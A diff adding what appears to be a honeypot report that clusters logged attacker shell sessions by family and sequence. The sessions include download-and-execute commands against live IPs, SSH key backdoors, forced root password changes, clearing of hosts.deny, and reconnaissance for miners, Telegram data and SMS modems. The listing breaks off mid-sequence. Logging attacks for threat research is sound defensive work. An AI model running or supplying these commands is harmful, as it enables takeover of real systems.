@@ -1,0 +1,1031 @@
+=== family 17f7aa85e15f8882  sequence 253ec182a1670ba2  sessions=62  ips=25  exact_variants=62  lines=4
+   1. nohup bash -c "exec 6<>/dev/tcp/128.199.213.13/60128 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/QDauQ6X3ym && chmod +x /tmp/QDauQ6X3ym && /tmp/QDauQ6X3ym MJICLguZOC+SCzMUkTI7lgoxCJghNZcUMgmZLzOTDy
+   2. dd bs=1 count=1911588 > /tmp/plPkvHoO1u
+   3. nohup bash -c "exec 6<>/dev/tcp/128.199.213.13/60128 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/QDauQ6X3ym && chmod +x /tmp/QDauQ6X3ym && /tmp/QDauQ6X3ym MJICLguZOC+SCzMUkTI7lgoxCJghNZcUMgmZLzOTDy
+   4. >D6@/XJ'8
+  gaps (s): [0.015, 0.207, 0.016]
+
+=== family 9376adfde5675c23  sequence 34a92956298d2ddf  sessions=20  ips=11  exact_variants=20  lines=5
+   1. echo 1 > /dev/null && cat /bin/echo
+   2. nohup $SHELL -c "curl http://47.242.66.123:60124/linux -o /tmp/oa88C0LxeR; if [ ! -f /tmp/oa88C0LxeR ]; then wget http://47.242.66.123:60124/linux -O /tmp/oa88C0LxeR; fi; if [ ! -f /tmp/oa88C0LxeR ]; 
+   3. head -c 3800636 > /tmp/Oi6VNwQ2Oy
+   4. nohup $SHELL -c "curl http://47.242.66.123:60124/linux -o /tmp/oa88C0LxeR; if [ ! -f /tmp/oa88C0LxeR ]; then wget http://47.242.66.123:60124/linux -O /tmp/oa88C0LxeR; fi; if [ ! -f /tmp/oa88C0LxeR ]; 
+   5. >A@/1'8ELF7}
+  gaps (s): [3.681, 0.01, 0.461, 0.012]
+
+=== family 9376adfde5675c23  sequence 2db9ae9f1b2f0f80  sessions=10  ips=9  exact_variants=10  lines=5
+   1. echo 1 > /dev/null && cat /bin/echo
+   2. nohup $SHELL -c "curl http://47.242.66.123:60124/linux -o /tmp/gw2adyhwXI; if [ ! -f /tmp/gw2adyhwXI ]; then wget http://47.242.66.123:60124/linux -O /tmp/gw2adyhwXI; fi; if [ ! -f /tmp/gw2adyhwXI ]; 
+   3. head -c 3800636 > /tmp/0bOv2moSuU
+   4. nohup $SHELL -c "curl http://47.242.66.123:60124/linux -o /tmp/gw2adyhwXI; if [ ! -f /tmp/gw2adyhwXI ]; then wget http://47.242.66.123:60124/linux -O /tmp/gw2adyhwXI; fi; if [ ! -f /tmp/gw2adyhwXI ]; 
+   5. >A@/1'8ELF7}
+  gaps (s): [3.229, 0.003, 0.074, 0.006]
+
+=== family a103d79c46716c12  sequence b567710fd6febe72  sessions=20  ips=14  exact_variants=1  lines=11
+   1. uname -a
+   2. hostname
+   3. uname -m&&pkill upnpsetup
+   4. chmod 777 zsvc
+   5. chmod 777 upnpsetup
+   6. sudo ./upnpsetup
+   7. ./upnpsetup
+   8. sudo ./zsvc
+   9. ./zsvc
+  10. sudo ./upnpsetup
+  11. ./upnpsetup
+  gaps (s): [1.817, 1.982, 49.06, 2.024, 33.854, 33.835, 2.143, 33.894, 1.974, 1.821]
+
+=== family a103d79c46716c12  sequence 59ac6074bd568eb7  sessions=9  ips=8  exact_variants=1  lines=3
+   1. uname -a
+   2. hostname
+   3. uname -m&&pkill upnpsetup
+  gaps (s): [1.499, 1.793]
+
+=== family bb5c89b25f7d0899  sequence 3ea55076380351f2  sessions=740  ips=209  exact_variants=1  lines=9
+   1. /ip cloud print
+   2. ifconfig
+   3. uname -a
+   4. cat /proc/cpuinfo
+   5. ps | grep '[Mm]iner'
+   6. ps -ef | grep '[Mm]iner'
+   7. ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect
+   8. locate D877F783D5D3EF8Cs
+   9. echo Hi | cat -n
+  gaps (s): [0.954, 0.955, 0.969, 0.915, 0.992, 0.914, 0.989, 1.001]
+
+=== family bb5c89b25f7d0899  sequence 949e8dc5e22928ea  sessions=23  ips=7  exact_variants=1  lines=8
+   1. /ip cloud print
+   2. ifconfig
+   3. uname -a
+   4. cat /proc/cpuinfo
+   5. ps | grep '[Mm]iner'
+   6. ps -ef | grep '[Mm]iner'
+   7. ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+   8. echo Hi | cat -n
+  gaps (s): [1.994, 1.728, 1.766, 2.267, 2.288, 2.188, 2.36]
+
+=== family c6da0f07a0a0ce9f  sequence 602e159e88089fb8  sessions=11305  ips=3907  exact_variants=11094  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:fBM9VMsHvO6r"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [1.653, 10.604, 1.258, 1.406, 1.656, 1.285, 1.456, 2.141, 1.639, 1.593, 1.41, 1.284, 1.256, 1.359, 1.281, 1.376, 1.644]
+
+=== family c6da0f07a0a0ce9f  sequence fb4ed7fb7d93ae31  sessions=544  ips=446  exact_variants=544  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "1988\nHcWG7LAYi5mn\nHcWG7LAYi5mn"|passwd|bash
+   5. echo "1988\nHcWG7LAYi5mn\nHcWG7LAYi5mn\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [1.677, 6.884, 1.835, 1.473, 2.199, 4.189, 1.489, 2.236, 1.728, 1.696, 1.522, 2.046, 2.498, 1.816, 1.478, 1.927, 1.694]
+
+=== family c6da0f07a0a0ce9f  sequence 54e7b078469a1407  sessions=346  ips=295  exact_variants=346  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "Password1\nblAgw2padFXn\nblAgw2padFXn"|passwd|bash
+   5. echo "Password1\nblAgw2padFXn\nblAgw2padFXn\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.204, 16.836, 4.146, 2.124, 2.34, 2.222, 2.363, 2.354, 2.058, 2.237, 2.122, 2.154, 2.31, 2.066, 2.306, 2.104, 2.184]
+
+=== family c6da0f07a0a0ce9f  sequence 5b386a656b3c9e44  sessions=63  ips=59  exact_variants=1  lines=3
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+  gaps (s): [2.228, 9.108]
+
+=== family c6da0f07a0a0ce9f  sequence 0af62b4704823666  sessions=39  ips=37  exact_variants=39  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "secret\n2ynrjFPqoj0N\n2ynrjFPqoj0N"|passwd|bash
+   5. echo "secret\n2ynrjFPqoj0N\n2ynrjFPqoj0N\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [1.726, 6.764, 2.184, 1.767, 1.968, 2.13, 1.734, 1.832, 2.306, 2.141, 2.096, 1.833, 1.812, 1.82, 1.752, 2.247, 2.407]
+
+=== family c6da0f07a0a0ce9f  sequence 0cbe7c418ff0839c  sessions=39  ips=39  exact_variants=39  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "password\nIRRY1FBJ7z42\nIRRY1FBJ7z42"|passwd|bash
+   5. echo "password\nIRRY1FBJ7z42\nIRRY1FBJ7z42\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.325, 8.412, 2.935, 3.025, 3.49, 3.164, 2.838, 3.408, 2.646, 3.749, 3.714, 3.29, 2.959, 3.217, 3.423, 3.39, 3.205]
+
+=== family c6da0f07a0a0ce9f  sequence 1a6fd4097eb96bd3  sessions=31  ips=31  exact_variants=31  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "admin\nXvmeisVrB4RL\nXvmeisVrB4RL"|passwd|bash
+   5. echo "admin\nXvmeisVrB4RL\nXvmeisVrB4RL\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.517, 6.396, 3.639, 3.808, 3.407, 3.37, 3.364, 3.284, 2.857, 3.288, 3.505, 2.765, 3.46, 3.492, 4.099, 3.4, 3.154]
+
+=== family c6da0f07a0a0ce9f  sequence 104f679186fb7ca9  sessions=26  ips=26  exact_variants=26  lines=4
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:W8vavqnyKibu"|chpasswd|bash
+  gaps (s): [2.176, 7.022, 1.752]
+
+=== family c6da0f07a0a0ce9f  sequence 13137d4b1fa93b26  sessions=24  ips=24  exact_variants=24  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "test\nGYTPDT8rkQlH\nGYTPDT8rkQlH"|passwd|bash
+   5. echo "test\nGYTPDT8rkQlH\nGYTPDT8rkQlH\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.235, 5.395, 2.039, 2.163, 2.055, 2.141, 2.144, 2.116, 2.354, 2.48, 2.125, 2.647, 1.984, 2.205, 2.223, 2.142, 2.534]
+
+=== family c6da0f07a0a0ce9f  sequence 0aecaf99d579426e  sessions=23  ips=23  exact_variants=23  lines=17
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:VVTTMCu7M4Ez"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  gaps (s): [2.365, 14.104, 2.28, 2.275, 2.164, 2.357, 2.23, 2.247, 2.633, 2.217, 2.317, 2.148, 2.324, 2.146, 2.171, 2.196]
+
+=== family c6da0f07a0a0ce9f  sequence ae3ff1189f38e306  sessions=20  ips=20  exact_variants=20  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "root\nF1vVV8SXrZUX\nF1vVV8SXrZUX"|passwd|bash
+   5. echo "root\nF1vVV8SXrZUX\nF1vVV8SXrZUX\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.161, 4.317, 1.98, 1.945, 2.006, 2.042, 2.071, 2.294, 1.959, 2.039, 1.915, 1.941, 1.824, 2.042, 3.158, 3.408, 2.49]
+
+=== family c6da0f07a0a0ce9f  sequence e5c0ae6510869cc8  sessions=19  ips=19  exact_variants=19  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "P@ssw0rd\nG5ibI3v95KpH\nG5ibI3v95KpH"|passwd|bash
+   5. echo "P@ssw0rd\nG5ibI3v95KpH\nG5ibI3v95KpH\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.246, 16.914, 3.16, 3.723, 4.19, 3.554, 4.446, 3.762, 3.806, 4.017, 3.594, 3.772, 3.421, 4.106, 3.483, 3.493, 3.371]
+
+=== family c6da0f07a0a0ce9f  sequence 2365a245643d3153  sessions=18  ips=18  exact_variants=18  lines=5
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:2jbXGOTK8e7t"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+  gaps (s): [1.886, 11.538, 2.732, 2.733]
+
+=== family c6da0f07a0a0ce9f  sequence b5645a55eb6d9ad8  sessions=18  ips=17  exact_variants=18  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "qwerty\n26IyQwsQE0H4\n26IyQwsQE0H4"|passwd|bash
+   5. echo "qwerty\n26IyQwsQE0H4\n26IyQwsQE0H4\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.743, 7.389, 3.001, 2.844, 3.069, 3.073, 2.702, 3.359, 2.895, 2.837, 3.374, 2.638, 2.681, 2.895, 2.755, 3.168, 3.09]
+
+=== family c6da0f07a0a0ce9f  sequence ff4e4e8a089312ea  sessions=16  ips=16  exact_variants=16  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "test123\nY5D6mKrPQyvR\nY5D6mKrPQyvR"|passwd|bash
+   5. echo "test123\nY5D6mKrPQyvR\nY5D6mKrPQyvR\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [1.627, 5.744, 1.498, 1.577, 1.578, 1.523, 1.511, 1.457, 1.616, 1.603, 1.491, 1.658, 1.706, 1.518, 1.499, 1.509, 1.505]
+
+=== family c6da0f07a0a0ce9f  sequence a2d2a79b3c1e534f  sessions=15  ips=15  exact_variants=15  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "P@ssword123\n8suwa4rs4ln9\n8suwa4rs4ln9"|passwd|bash
+   5. echo "P@ssword123\n8suwa4rs4ln9\n8suwa4rs4ln9\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.874, 9.12, 2.747, 2.786, 2.728, 2.496, 2.915, 2.546, 2.616, 2.838, 2.709, 2.498, 2.905, 2.494, 2.637, 2.756, 2.632]
+
+=== family c6da0f07a0a0ce9f  sequence c95f19c1c0d6f17d  sessions=15  ips=15  exact_variants=15  lines=11
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:iLj2fDqAFMiu"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  gaps (s): [2.053, 7.478, 1.901, 1.977, 1.872, 1.864, 1.804, 2.028, 1.839, 2.783]
+
+=== family c6da0f07a0a0ce9f  sequence da91558d78214d2e  sessions=15  ips=14  exact_variants=15  lines=10
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:7U0x50WejnqZ"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  gaps (s): [1.343, 11.26, 0.787, 0.828, 0.849, 0.793, 0.864, 0.983, 0.832]
+
+=== family c6da0f07a0a0ce9f  sequence 2cbc61c8ebc730a0  sessions=14  ips=14  exact_variants=14  lines=9
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:i07oVQV9PmkM"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  gaps (s): [1.677, 12.705, 1.881, 1.533, 2.012, 4.121, 1.446, 3.379]
+
+=== family c6da0f07a0a0ce9f  sequence a782b8c6d8d0fd89  sessions=14  ips=14  exact_variants=14  lines=15
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
